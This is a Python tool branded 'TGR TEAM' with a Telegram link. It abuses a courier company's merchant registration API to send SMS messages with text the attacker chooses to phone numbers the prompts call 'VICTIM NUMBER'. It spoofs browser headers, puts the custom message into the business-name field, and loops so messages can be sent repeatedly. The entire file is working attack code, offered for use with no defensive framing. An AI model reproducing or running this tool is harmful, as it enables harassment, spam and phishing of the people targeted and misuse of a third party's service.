import os
import sys
import json
import requests

HEADERS = {
    'host': 'api-merchant.carrybee.com',
    'content-type': 'application/json',
    'accept': 'application/json',
    'origin': 'https://merchant.carrybee.com',
    'referer': 'https://merchant.carrybee.com/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Mobile Safari/537.36'
}

def clear_screen():
    os.system('clear' if os.name != 'nt' else 'cls')

def display_banner():
    clear_screen()
    banner = """
    \033[1;31m
  ████████╗ ██████╗  ██████╗  ████████╗███████╗ █████╗ ███╗   ███╗
  ╚══██╔══╝██╔════╝ ██╔══██╗ ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
     ██║   ██║  ███╗██████╔╝    ██║   █████╗  ███████║██╔████╔██║
     ██║   ██║   ██║██╔══██╗    ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
     ██║   ╚██████╔╝██║  ██║    ██║   ███████╗██║  ██║██║ ╚═╝ ██║
     ╚═╝    ╚═════╝ ╚═╝  ╚═╝    ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
    \033[0m
————————————————──────────────────────────────────
DEVELOPER: TGR TEAM
TG LINK: https://t.me/+jnSdSlPbNxU0NGM1
————————————————──────────────────────────────────
    """
    print(banner)

def format_phone_number(phone):
    phone = phone.strip()
    if not phone.startswith("+88") and not phone.startswith("88"):
        if phone.startswith("01"):
            phone = "88" + phone
        elif phone.startswith("1"):
            phone = "880" + phone
    return phone

def send_sms(name, phone, custom_sms):
    payload = {
        "name": name,
        "phone_number": phone,
        "business_name": custom_sms
    }
    
    try:
        response = requests.post(
            'https://api-merchant.carrybee.com/api/v2/merchant/register',
            json=payload,
            headers=HEADERS,
            timeout=10
        )
        
        if response.status_code == 200:
            print("\n\033[1;32m[✔] SMS SENT SUCCESSFUL!\033[0m")
            print(f"\033[1;36mHTTP Status: {response.status_code}\033[0m")
        else:
            print(f"\n\033[1;33m[!] Response Status Code: {response.status_code}\033[0m")
            
    except Exception as e:
        print(f"\n\033[1;31m[✘] Failed to send SMS: {str(e)}\033[0m")

def main():
    while True:
        display_banner()
        
        # Name Input
        name = input("\033[1;33m[/] NAME  ➤ \033[0m").strip()
        if not name:
            name = "TGR User"

        # Victim Phone Number Input
        phone_input = input("\033[1;33m[/] VICTIM NUMBER ➤ +88\033[0m").strip()
        full_phone = format_phone_number(phone_input)

        # Victim Custom SMS Input
        custom_sms = input("\033[1;33m[/] VICTIM  SMS  ➤ \033[0m").strip()

        print("\n\033[1;34m[⏳] Sending SMS, please wait...\033[0m")
        send_sms(name, full_phone, custom_sms)

        print("\n" + "—"*50)
        input("\033[1;35mType Enter to send another SMS...\033[0m")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n\033[1;31m[!] Exiting TGR TEAM Tool. Goodbye!\033[0m")
        sys.exit()
